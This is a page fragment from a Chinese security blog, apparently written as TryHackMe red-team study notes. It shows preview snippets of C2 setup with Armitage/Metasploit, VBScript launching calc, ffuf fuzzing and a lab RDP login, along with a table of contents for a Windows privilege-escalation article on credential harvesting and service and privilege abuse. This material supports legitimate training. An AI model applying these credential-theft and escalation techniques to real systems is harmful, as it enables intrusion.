href="/2025/02/27/THM/%E3%80%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91%5BTHM%5DRed%20Teaming--Intro%20to%20C2%EF%BC%88C2%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%EF%BC%89/" title="【学习笔记】[THM]Red Teaming--Intro to C2（C2服务器搭建）"><img class="cover" src="/img/cover/3.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-27</div><div class="info-item-2">【学习笔记】[THM]Red Teaming--Intro to C2（C2服务器搭建）</div></div><div class="info-2"><div class="info-item-1">设置C2服务器前提条件—下载msf采用一款免费的C2服务器–Armitage，他依赖msf框架，所以还是先下载msf官方给的下载方式 123curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; \  chmod 755 msfinstall &amp;&amp; \  ./msfinstall  这一步会直接下载好依赖项和msf本身 安装Armitage下载、构建和安装 Armitage1git clone https://gitlab.com/kalilinux/packages/armitage.git &amp;&amp; cd armitage  然后运行构建脚本（在这一步之前首先要先装有java，版本不能太高java11就行sudo apt install openjdk-11-jdk） 1bash...</div></div></div></a><a class="pagination-related" href="/2025/03/02/THM/%E3%80%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91%5BTHM%5DRed%20Teaming--Red%20Team%20Recon%EF%BC%88%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%89/" title="【学习笔记】[THM]Red Teaming--Red Team Recon（信息收集）"><img class="cover" src="/img/cover/4.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-02</div><div class="info-item-2">【学习笔记】[THM]Red Teaming--Red Team Recon（信息收集）</div></div><div class="info-2"><div class="info-item-1">内置工具（系统可识别并自下载的）whois一般能查到以下信息： 12345678910Registrar WHOIS server  注册 WHOIS 服务器Registrar URL  注册 URLRecord creation date  记录创建日期Record update date  记录更新日期Registrant contact info and address (unless withheld for privacy)注册人的联系信息和地址（除非出于隐私考虑而保留）Admin contact info and address (unless withheld for privacy)管理员联系信息和地址（除非出于隐私原因而保留）Tech contact info and address (unless withheld for privacy)技术联系信息和地址（除非出于隐私原因而隐瞒）  但一般都会有隐瞒，以我博客为例，基本全隐瞒了 nslookup使用默认 DNS 服务器来获取与域相关的 A 和 AAAA...</div></div></div></a><a class="pagination-related" href="/2025/03/09/THM/%E3%80%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91%5BTHM%5DRed%20Teaming--Weaponization%EF%BC%88%E6%AD%A6%E5%99%A8%E5%8C%96%EF%BC%89/" title="【学习笔记】[THM]Red Teaming--Weaponization（武器化）"><img class="cover" src="/img/cover/2.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-09</div><div class="info-item-2">【学习笔记】[THM]Red Teaming--Weaponization（武器化）</div></div><div class="info-2"><div class="info-item-1">部署windows计算机要下载一个远程桌面的工具 1sudo apt install freerdp2-x11  然后按照的房间的提示启动 1xfreerdp /v:10.10.61.163 /u:thm /p:TryHackM3 +clipboard   wshWindows 脚本主机(wsh)是一个内置的 Windows 管理工具，它运行批处理文件以自动化和管理作系统中的任务cscript.exe（用于命令行脚本）和 wscript.exe（用于 UI 脚本），负责执行各种Microsoft Visual Basic 脚本 （VBScript），包括 vbs 和 vbe新建一个文件写入以下内容然后运行它（文件改不改名其实无所谓的） 1wscript 1.vbs   1cscript 1.vbs  将刚刚的脚本改成以下内容，然后重新运行，就弹计算器了 12Set shell = WScript.CreateObject(&quot;Wscript.Shell&quot;)shell.Run(&quot;C:\Windows\System32\calc.exe &quot;...</div></div></div></a><a class="pagination-related" href="/2025/03/13/THM/%E3%80%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91%5BTHM%5Dffuf/" title="【学习笔记】[THM]ffuf"><img class="cover" src="/img/cover/4.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-13</div><div class="info-item-2">【学习笔记】[THM]ffuf</div></div><div class="info-2"><div class="info-item-1">基本使用直接扫网站就行了，根据之前的提示 1./ffuf -u http://10.10.127.184/FUZZ -w ../SecLists/Discovery/Web-Content/big.txt  回答问题：您找到的第一个状态代码为 200 的文件是什么？ 查找页面和目录使用通用文件列表（如 raft-medium-files-lowercase.txt）开始枚举 1./ffuf -u http://10.10.127.184/FUZZ -w ../SecLists/Discovery/Web-Content/raft-medium-files-lowercase.txt  对应第一个问题：您找到的是什么文本文件？ 尝试仅针对索引页面的常见扩展 1./ffuf -u http://10.10.127.184/indexFUZZ -w ../SecLists/Discovery/Web-Content/web-extensions.txt  对应第二个问题：为索引页找到哪两个文件扩展名？ 从此单词列表中排除 4 个字母的扩展名，因为它会导致许多误报 1./ffuf -u...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/joker.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">lan1oc</div><div class="author-info-description">57qv6I+c54uX572i5LqG</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">67</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">19</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/lan1oc"><i class="fab fa-github"></i><span>没啥用的仓库</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">随便写写</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">基本知识点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%B6%E9%9B%86%E5%AF%86%E7%A0%81%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BD%8D%E7%BD%AE"><span class="toc-number">2.</span> <span class="toc-text">收集密码的常用位置</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E7%9A%84-Windows-%E5%AE%89%E8%A3%85"><span class="toc-number">2.1.</span> <span class="toc-text">无人值守的 Windows 安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Powershell-%E5%8E%86%E5%8F%B2%E5%91%BD%E4%BB%A4"><span class="toc-number">2.2.</span> <span class="toc-text">Powershell 历史命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%9D%E5%AD%98%E7%9A%84-Windows-%E5%87%AD%E6%8D%AE"><span class="toc-number">2.3.</span> <span class="toc-text">保存的 Windows 凭据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IIS-%E9%85%8D%E7%BD%AE"><span class="toc-number">2.4.</span> <span class="toc-text">IIS 配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8E%E8%BD%AF%E4%BB%B6%E4%B8%AD%E6%A3%80%E7%B4%A2%E5%87%AD%E6%8D%AE%EF%BC%9APuTTY"><span class="toc-number">2.5.</span> <span class="toc-text">从软件中检索凭据：PuTTY</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D%E4%B8%8E%E5%9B%9E%E7%AD%94%E9%97%AE%E9%A2%98"><span class="toc-number">2.6.</span> <span class="toc-text">实操与回答问题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#julia-jones-%E7%94%A8%E6%88%B7%E7%9A%84%E5%AF%86%E7%A0%81%E5%B7%B2%E4%BF%9D%E7%95%99%E5%9C%A8-Powershell-%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%E4%B8%AD%E3%80%82%E5%AF%86%E7%A0%81%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">2.6.1.</span> <span class="toc-text">julia.jones 用户的密码已保留在 Powershell 历史记录中。密码是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E4%B8%BB%E6%9C%BA%E4%B8%8A%E6%AD%A3%E5%9C%A8%E8%BF%90%E8%A1%8C-Web-%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%82%E5%9C%A8%E4%B8%8E-IIS-%E5%85%B3%E8%81%94%E7%9A%84-web-config-%E6%96%87%E4%BB%B6%E4%B8%8A%E6%9F%A5%E6%89%BE%E4%BB%BB%E4%BD%95%E6%84%9F%E5%85%B4%E8%B6%A3%E7%9A%84%E5%AF%86%E7%A0%81%E3%80%82db-admin-%E7%94%A8%E6%88%B7%E7%9A%84%E5%AF%86%E7%A0%81%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">2.6.2.</span> <span class="toc-text">远程主机上正在运行 Web 服务器。在与 IIS 关联的 web.config 文件上查找任何感兴趣的密码。db_admin 用户的密码是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%82%A8%E7%9A%84-Windows-%E5%87%AD%E6%8D%AE%E4%B8%8A%E4%BF%9D%E5%AD%98%E4%BA%86%E5%AF%86%E7%A0%81%E3%80%82%E4%BD%BF%E7%94%A8-cmdkey-%E5%92%8C-runas%EF%BC%8C%E4%B8%BA-mike-katz-%E7%94%9F%E6%88%90%E4%B8%80%E4%B8%AA-shell%EF%BC%8C%E5%B9%B6%E4%BB%8E%E4%BB%96%E7%9A%84%E6%A1%8C%E9%9D%A2%E4%B8%8A%E6%A3%80%E7%B4%A2%E6%A0%87%E5%BF%97%E3%80%82"><span class="toc-number">2.6.3.</span> <span class="toc-text">您的 Windows 凭据上保存了密码。使用 cmdkey 和 runas，为 mike.katz 生成一个 shell，并从他的桌面上检索标志。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A3%80%E7%B4%A2%E5%AD%98%E5%82%A8%E5%9C%A8%E6%82%A8%E7%9A%84%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%B8%8B%E4%BF%9D%E5%AD%98%E7%9A%84-PuTTY-%E4%BC%9A%E8%AF%9D%E4%B8%AD%E7%9A%84%E5%B7%B2%E4%BF%9D%E5%AD%98%E5%AF%86%E7%A0%81%E3%80%82thom-smith-%E7%94%A8%E6%88%B7%E7%9A%84%E5%AF%86%E7%A0%81%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">2.6.4.</span> <span class="toc-text">检索存储在您的配置文件下保存的 PuTTY 会话中的已保存密码。thom.smith 用户的密码是什么？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF"><span class="toc-number">3.</span> <span class="toc-text">其他提权思路</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">3.1.</span> <span class="toc-text">计划任务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msi-%E6%96%87%E4%BB%B6%E6%8F%90%E6%9D%83"><span class="toc-number">3.2.</span> <span class="toc-text">msi 文件提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9E%E7%AD%94%E9%97%AE%E9%A2%98"><span class="toc-number">3.3.</span> <span class="toc-text">回答问题</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BB%A5%E7%94%A8%E6%9C%8D%E5%8A%A1%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF-%E4%BB%A5%E4%B8%8B%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95%E6%98%AF%E9%80%90%E7%BA%A7%E5%85%9C%E5%BA%95%E7%9A%84"><span class="toc-number">4.</span> <span class="toc-text">滥用服务配置错误(以下三种方法是逐级兜底的)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86%E7%82%B9-1"><span class="toc-number">4.0.1.</span> <span class="toc-text">基本知识点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E6%9C%8D%E5%8A%A1%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%8D%E5%AE%89%E5%85%A8%E6%9D%83%E9%99%90"><span class="toc-number">4.1.</span> <span class="toc-text">对服务可执行文件的不安全权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AA%E5%8A%A0%E5%BC%95%E5%8F%B7%E7%9A%84%E6%9C%8D%E5%8A%A1%E8%B7%AF%E5%BE%84"><span class="toc-number">4.2.</span> <span class="toc-text">未加引号的服务路径</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90"><span class="toc-number">4.3.</span> <span class="toc-text">不安全的服务权限</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BB%A5%E7%94%A8%E5%8D%B1%E9%99%A9%E6%9D%83%E9%99%90"><span class="toc-number">5.</span> <span class="toc-text">滥用危险权限</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SeBackup-SeRestore"><span class="toc-number">5.1.</span> <span class="toc-text">SeBackup &#x2F; SeRestore</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">5.1.1.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D"><span class="toc-number">5.1.2.</span> <span class="toc-text">实操</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SeTakeOwnership"><span class="toc-number">5.2.</span> <span class="toc-text">SeTakeOwnership</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-1"><span class="toc-number">5.2.1.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D-1"><span class="toc-number">5.2.2.</span> <span class="toc-text">实操</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SeImpersonate-SeAssignPrimaryToken"><span class="toc-number">5.3.</span> <span class="toc-text">SeImpersonate &#x2F; SeAssignPrimaryToken</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-2"><span class="toc-number">5.3.1.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E6%93%8D%EF%BC%88RogueWinRM-%E6%BC%8F%E6%B4%9E%EF%BC%89"><span class="toc-number">5.3.2.</span> <span class="toc-text">实操（RogueWinRM 漏洞）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BB%A5%E7%94%A8%E6%98%93%E5%8F%97%E6%94%BB%E5%87%BB%E7%9A%84%E8%BD%AF%E4%BB%B6"><span class="toc-number">6.</span> <span class="toc-text">滥用易受攻击的软件</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AA%E4%BF%AE%E8%A1%A5%E7%9A%84%E8%BD%AF%E4%BB%B6"><span class="toc-number">6.1.</span> <span class="toc-text">未修补的软件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A1%88%E4%BE%8B%E7%A0%94%E7%A9%B6%EF%BC%9ADruva-inSync-6-6-3"><span class="toc-number">6.2.</span> <span class="toc-text">案例研究：Druva inSync 6.6.3</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC"><span class="toc-number">7.</span> <span class="toc-text">自动化脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B1%8C%E8%B1%86"><span class="toc-number">7.1.</span> <span class="toc-text">豌豆</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PrivescCheck"><span class="toc-number">7.2.</span> <span class="toc-text">PrivescCheck</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WES-NG"><span class="toc-number">7.3.</span> <span class="toc-text">WES-NG</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/06/18/%E5%BB%BA%E7%AB%99/%E5%8D%9A%E5%AE%A2%E6%81%A2%E5%A4%8D/" title="博客恢复"><img src="/img/cover/4.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="博客恢复"/></a><div class="content"><a class="title" href="/2025/06/18/%E5%BB%BA%E7%AB%99/%E5%8D%9A%E5%AE%A2%E6%81%A2%E5%A4%8D/" title="博客恢复">博客恢复</a><time datetime="2025-06-17T16:00:00.000Z" title="发表于 2025-06-18 00:00:00">2025-06-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/05/src/%5Bsrc%5D%E9%A9%AC%E4%B8%8A%E6%B6%88%E8%B4%B9src%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF/" title="[src]马上消费src基本信息"><img src="/img/cover/1.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="[src]马上消费src基本信息"/></a><div class="content"><a class="title" href="/2025/06/05/src/%5Bsrc%5D%E9%A9%AC%E4%B8%8A%E6%B6%88%E8%B4%B9src%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF/" title="[src]马上消费src基本信息">[src]马上消费src基本信息</a><time datetime="2025-06-05T08:00:00.000Z" title="发表于 2025-06-05 16:00:00">2025-06-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/05/%E5%80%BC%E5%AE%88/%E5%80%BC%E5%AE%884/" title="值守4"><img src="/img/cover/3.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="值守4"/></a><div class="content"><a class="title" href="/2025/06/05/%E5%80%BC%E5%AE%88/%E5%80%BC%E5%AE%884/" title="值守4">值守4</a><time datetime="2025-06-05T08:00:00.000Z" title="发表于 2025-06-05 16:00:00">2025-06-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/04/%E5%80%BC%E5%AE%88/%E5%80%BC%E5%AE%883/" title="值守3"><img src="/img/cover/2.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="值守3"/></a><div class="content"><a class="title" href="/2025/06/04/%E5%80%BC%E5%AE%88/%E5%80%BC%E5%AE%883/" title="值守3">值守3</a><time datetime="2025-06-04T08:00:00.000Z" title="发表于 2025-06-04 16:00:00">2025-06-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/03/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A01/" title="内网渗透学习1"><img src="/img/cover/3.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网渗透学习1"/></a><div class="content"><a class="title" href="/2025/06/03/%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A01/" title="内网渗透学习1">内网渗透学习1</a><time datetime="2025-06-03T08:00:00.000Z" title="发表于 2025-06-03 16:00:00">2025-06-03</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/5.webp);"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2025 By lan1oc</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>